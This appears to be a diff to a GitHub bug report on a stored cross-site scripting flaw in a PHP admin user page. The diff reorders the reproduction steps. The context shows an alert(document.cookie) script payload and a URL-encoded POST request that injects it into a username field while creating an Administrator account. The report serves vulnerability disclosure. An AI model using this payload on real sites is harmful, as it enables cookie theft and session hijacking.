@@ -29,6 +29,8 @@ Payload:<script>alert(document.cookie)</script>
 
 ![image](https://github.com/heitaoa999/bug_report/blob/main/pictures/xss2.png)
 
+4. Click on Save
+
 Transmission packet
 
 ```
@@ -56,8 +58,6 @@ Connection: close
 
 deptid=&U_NAME=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&deptid=&U_USERNAME=a&deptid=&U_PASS=b&U_ROLE=Administrator&save=
 ```
-
-4. Click on Save
 
 5. Payload will trigger when a user visits on http://localhost/philosophy/admin/user/index.php
 
